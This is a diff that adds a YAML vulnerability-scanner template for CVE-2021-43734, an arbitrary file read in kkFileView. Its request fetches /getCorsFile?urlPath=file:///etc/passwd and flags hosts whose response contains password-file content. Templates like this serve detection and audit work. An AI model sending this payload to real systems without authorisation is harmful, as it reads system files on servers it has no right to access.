@@ -1,0 +1,20 @@
+id: poc-yaml-kkfileview-getcorsfile-file-read
+info:
+  name: kkFileView getCorsFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - CVE-2021-43734
+  - 两高一弱
+  finger: kkFileView
+requests:
+- method: GET
+  path: /getCorsFile?urlPath=file:///etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body, "root:") && contains(body, "/bin") &&
+
+    !contains(body, "<")
+
+    '
+variables: {}
+transport: http
